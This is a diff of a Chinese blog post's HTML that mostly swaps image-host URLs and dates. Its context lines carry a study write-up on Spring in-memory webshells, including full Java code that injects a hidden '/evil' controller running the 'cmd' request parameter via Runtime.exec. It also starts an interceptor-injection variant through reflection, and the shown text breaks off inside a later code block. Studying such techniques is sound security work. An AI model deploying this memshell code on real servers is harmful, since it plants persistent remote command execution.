@@ -27,38 +27,38 @@
 <meta property="og:site_name" content="blueSatchel&#39;s blog">
 <meta property="og:description" content="spring内存马原理学习记录">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220422002418321.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220422002516259.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421174514491.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421174800350.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421175523028.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421180801171.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421180923594.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421181210684.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421181317837.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421182037996.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421183153513.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421184453462.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421184720102.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421185007532.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422141432909.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422141533441.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422201339819.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422201815223.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422202640251.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422203055508.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422203515764.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422112630154.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422121240656.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422123659126.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422123824924.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422124507783.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220422002418321.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220422002516259.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421174514491.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421174800350.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421175523028.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421180801171.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421180923594.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421181210684.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421181317837.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421182037996.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421183153513.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421184453462.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421184720102.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421185007532.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422141432909.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422141533441.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422201339819.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422201815223.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422202640251.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422203055508.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422203515764.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422112630154.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422121240656.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422123659126.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422123824924.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422124507783.png">
 <meta property="article:published_time" content="2022-04-21T09:19:10.000Z">
-<meta property="article:modified_time" content="2022-04-24T12:53:31.000Z">
+<meta property="article:modified_time" content="2024-09-28T14:07:42.779Z">
 <meta property="article:author" content="blueSatchel">
 <meta property="article:tag" content="springMemshell">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220422002418321.png">
+<meta name="twitter:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220422002418321.png">
 
 <link rel="canonical" href="http://example.com/2022/04/21/spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">
 
@@ -249,7 +249,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-24 20:53:31" itemprop="dateModified" datetime="2022-04-24T20:53:31+08:00">2022-04-24</time>
+                <time title="修改时间：2024-09-28 22:07:42" itemprop="dateModified" datetime="2024-09-28T22:07:42+08:00">2024-09-28</time>
               </span>
 
           
@@ -300,9 +300,9 @@
 <p>springBoot用过之后觉得这配置好麻烦……</p>
 <p>接着创建resources目录配置spring和springMVC的配置文件</p>
 <p>大体目录结构</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220422002418321.png" alt="image-20220422002418321"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220422002418321.png" alt="image-20220422002418321"></p>
 <p>配置文件自定义,右键new选择spring Config</p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220422002516259.png" alt="image-20220422002516259" style="zoom:80%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220422002516259.png" alt="image-20220422002516259" style="zoom:80%;" />
 
 <p>spring配置文件,命名自定义,后面在web.xml中写对应就行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">        &quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Spring配置文件：除了控制器之外的bean对象都在这被扫描 --&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;com.test.service&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -321,37 +321,37 @@
 <li>RequestMappingInfo类，对RequestMapping注解封装。里面包含http请求头的相关信息。如uri、method、params、header等参数。一个对象对应一个RequestMapping注解</li>
 <li>HandlerMethod类，是对Controller的处理请求方法的封装。里面包含了该方法所属的bean对象、该方法对应的method对象、该方法的参数等。</li>
 </ol>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421174514491.png" alt="image-20220421174514491"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421174514491.png" alt="image-20220421174514491"></p>
 <p>SpringMVC初始化的时候,对每个容器中的Bean的构造方法和属性设置之后,将会调用<code> InitializingBean</code>接口的<code>afterPropertiesSet</code>方法</p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421174800350.png" alt="image-20220421174800350" style="zoom:67%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421174800350.png" alt="image-20220421174800350" style="zoom:67%;" />
 
 <p>其中实现类 RequestMappingHandlerMapping 用来处理具有 <code>@Controller</code> 注解类中的方法级别的 <code>@RequestMapping</code></p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421175523028.png" alt="image-20220421175523028"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421175523028.png" alt="image-20220421175523028"></p>
 <p>它的<code>afterPropertiesSet</code>先是对静态内部配置类进行了初始化,然后调用了其抽象父类的<code>afterPropertiesSet</code>方法</p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421180801171.png" alt="image-20220421180801171" style="zoom:80%;" />
+<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421180801171.png" alt="image-20220421180801171" style="zoom:80%;" />
 
 <p>其抽象父类的对应方法中又调用了<code>initHandlerMethods</code>方法</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421180923594.png" alt="image-20220421180923594"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421180923594.png" alt="image-20220421180923594"></p>
 <p>这个方法调用了 initHandlerMethods 方法，首先获取了 Spring 中注册的 Bean，然后循环遍历，调用 <code>processCandidateBean</code> 方法处理 Bean。</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421181210684.png" alt="image-20220421181210684"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421181210684.png" alt="image-20220421181210684"></p>
 <p>processCandidateBean中获取bean的类型并且符合isHandler要求就进行方法检测<code>detectHandlerMethods()</code></p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421181317837.png" alt="image-20220421181317837"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421181317837.png" alt="image-20220421181317837"></p>
 <p>isHandler调用的是其方法实现类<code>RequestMappingHandlerMapping</code>中的isHandler,它判断了该bean的定义是否带有<code>@Controller</code>或<code>@RequestMapping</code>注解</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421182037996.png" alt="image-20220421182037996"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421182037996.png" alt="image-20220421182037996"></p>
 <p>这关过去之后,就开始查找handler methods并注册,</p>
 <p><code>handler method</code>通俗点讲其实就是controller中的方法</p>
 <p>有一说一,这段代码还真不好理解</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421183153513.png" alt="image-20220421183153513"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421183153513.png" alt="image-20220421183153513"></p>
 <p>这部分有两个关键功能，一个是 <code>getMappingForMethod</code> 方法根据 handler method 创建<code>RequestMappingInfo</code> 对象，一个是 <code>registerHandlerMethod</code> 方法将 handler method 与创建 <code>RequestMappingInfo </code>进行相关映射。</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421184453462.png" alt="image-20220421184453462"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421184453462.png" alt="image-20220421184453462"></p>
 <p>注册完成之后的信息都存在这样一个类中</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421184720102.png" alt="image-20220421184720102"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421184720102.png" alt="image-20220421184720102"></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/w-y-c-m/p/8416630.html">详细请求调用流程</a></p>
 <p>lookupPath就是请求的相对地址,比如/user/login</p>
 <p>当一次请求进来的时候,首先会在<code>AbstractHandlerMethodMapping#lookupHandlerMethod</code>方法中获取直接匹配的<code>RequestMappingInfos</code>列表</p>
 <p>如果没有匹配的<code>RequestMappingInfos</code>,则遍历所有的<code>MappingRegistry.mappingLookup</code>中保存的所有<code>RequestMappingInfos</code></p>
 <p>最后,获取最佳匹配的 RequestMappingInfo 对应的 HandlerMethod</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220421185007532.png" alt="image-20220421185007532"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220421185007532.png" alt="image-20220421185007532"></p>
 <p>大概原理跟着顺了一遍</p>
 <h2 id="获取context"><a href="#获取context" class="headerlink" title="获取context"></a>获取context</h2><p>想要添加内存马,都必须得获取context</p>
 <p>不明所以,先把代码粘贴过来</p>
@@ -361,30 +361,30 @@
 <p>获取context应该算是所有内存马最重要的地方了吧,因为context作为上下文对象,它里面往往存储了很多承接多个功能模块的信息,这些信息中往往就存在着能注入内存马的部分</p>
 <h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>获得的context不能<code>getBean(RequestMappingHandlerMapping.class)</code>,会抛出一个找不到这个bean的异常</p>
 <p>下面两图分别是方法一和方法四获取到的context的区别,具体原因我猜测是因为在法一这个命名空间下没有RMSM这个bean的定义</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422141432909.png" alt="image-20220422141432909"></p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422141533441.png" alt="image-20220422141533441"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422141432909.png" alt="image-20220422141432909"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422141533441.png" alt="image-20220422141533441"></p>
 <h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>在spring5以上失效了,失效原因是因为没有<code>getWebApplicationContext</code>方法了</p>
 <h5 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h5><p>也在spring5以上失效了,失效原因是因为没有<code>getWebApplicationContext</code>方法了</p>
 <h5 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h5><p>方法四呢,联系这两天学习c#多线程学习到的东西就比较容易理解了,</p>
 <p>该方法使用的是<code>RequestContextHolder</code>对象</p>
 <p>该对象开头的注释大概可以理解为该类以线程绑定的形式暴露一个request对象,同时这个对象可以被所有当前线程产生的子线程继承</p>
 <p>在不同的类中都可以拿到同一个对象实例，但不同的线程取到的实例不同我们将这种数据称之为<strong>线程本地变量</strong>，这种操作叫做<strong>线程绑定</strong>。(类似于针对线程将对象进行个性化定制)</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422201339819.png" alt="image-20220422201339819"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422201339819.png" alt="image-20220422201339819"></p>
 <p>使用<code>RequestContextHolder#getRequestAttributes()</code>方法返回一个reqeust的Attributes</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422201815223.png" alt="image-20220422201815223"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422201815223.png" alt="image-20220422201815223"></p>
 <p>从它的Attributes中获得对应的<code>WebApplicationContext</code>,并且命名空间也正常,可以使用</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422202640251.png" alt="image-20220422202640251"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422202640251.png" alt="image-20220422202640251"></p>
 <h5 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h5><p>在3.2.x以上版本可以使用 </p>
 <p>这个方法看起来有点暴力</p>
 <p><code>LiveBeansView</code>这个类中有一个applicationContext集合</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422203055508.png" alt="image-20220422203055508"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422203055508.png" alt="image-20220422203055508"></p>
 <p>直接通过反射获取即可,唯一说的一点就是static变量反射get的时候可以传null进去,原因呢就是static是所有对象共享的变量,大概这样理解吧</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field filed = Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="keyword">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>对这个类的理解</p>
 </blockquote>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422203515764.png" alt="image-20220422203515764"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422203515764.png" alt="image-20220422203515764"></p>
 <p>看了这个类源码中的注释,大概意思呢就是</p>
 <p>这个类是生命周期还未结束的bean们的一个曝光适配器,建立了一个当前bean们和他们的依赖的快照</p>
 <p>可以将bean和他们的依赖对应关系保存起来??</p>
@@ -394,14 +394,14 @@
 
 <p>所以就要先获取<code>WebApplicationContext</code>才能获取到<code>RequestMappingHandlerMapping</code>对象</p>
 <p>获取到<code>RequestMappingHandlerMapping</code>对象就可以开始构造<code>RequestMappingInfo</code>了,将写好的恶意内部类和恶意方法同构造好的<code>RequestMappingInfo</code>一起使用<code>requestMappingHandlerMapping#registerMapping</code>注册到<code>requestMappingHandlerMapping</code>中</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422112630154.png" alt="image-20220422112630154"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422112630154.png" alt="image-20220422112630154"></p>
 <p>代码</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">inject</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException </span>&#123;</span><br><span class="line"></span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        PatternsRequestCondition url = <span class="keyword">new</span> PatternsRequestCondition(<span class="string">&quot;/evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        RequestMethodsRequestCondition requestMethodsRequestCondition = <span class="keyword">new</span> RequestMethodsRequestCondition();</span><br><span class="line">        </span><br><span class="line">        Method method = injectController.class.getMethod(<span class="string">&quot;evil&quot;</span> );</span><br><span class="line">        RequestMappingInfo requestMappingInfo = <span class="keyword">new</span> RequestMappingInfo(url,requestMethodsRequestCondition,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        injectController injectController = <span class="keyword">new</span> injectController();</span><br><span class="line"></span><br><span class="line">        requestMappingHandlerMapping.registerMapping(requestMappingInfo,injectController,method);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;inject&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RestController</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">injectController</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">evil</span><span class="params">()</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">     <span class="comment">//request也可以直接写成参数public String evil(HttpServletRequest request)</span></span><br><span class="line">            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            </span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>至此,controller类型的内存马算是做了初步了解</p>
 <h2 id="Inteceptor内存马"><a href="#Inteceptor内存马" class="headerlink" title="Inteceptor内存马"></a>Inteceptor内存马</h2><p>学习完controller内存马之后,就对spring基础的方法注册流程有了一个了解</p>
 <p><code>AbstractHandlerMapping#adaptedInterceptors</code>中存储了HandlerInterceptor</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422121240656.png" alt="image-20220422121240656"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422121240656.png" alt="image-20220422121240656"></p>
 <p>所以流程就很清晰了,首先获取到<code>AbstractHandlerMapping</code>,然后通过反射获取到<code>adaptedInterceptors</code>列表,往里面添加写好的恶意<code>interceptor</code>即可</p>
 <p><code>AbstractHandlerMapping</code>的运行类还是<code>RequestMappingHandlerMapping</code>,所以getBean的时候还是填<code>RequestMappingHandlerMapping.class</code></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -411,12 +411,12 @@
 <blockquote>
 <p>在期间有个坑</p>
 </blockquote>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422123659126.png" alt="image-20220422123659126"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422123659126.png" alt="image-20220422123659126"></p>
 <p>就是看似我获取到的是向上转型得到的AbstractHandlerMapping对象,但是我这里使用了getClass是错误的,</p>
 <p>当前AbstractHandlerMapping对应的正在运行中的对象是RequestMappingHandlerMapping对象</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422123824924.png" alt="image-20220422123824924"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422123824924.png" alt="image-20220422123824924"></p>
 <p>一般呢子类是可以获取到父类的变量的,但是<code>adaptedInterceptors</code>是private修饰的,不能被子类继承,也就是说,子类中根本就没有这个字段,所以在这里需要通过<code>AbstractHandlerMapping.class</code>来获取<code>field</code></p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220422124507783.png" alt="image-20220422124507783"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220422124507783.png" alt="image-20220422124507783"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 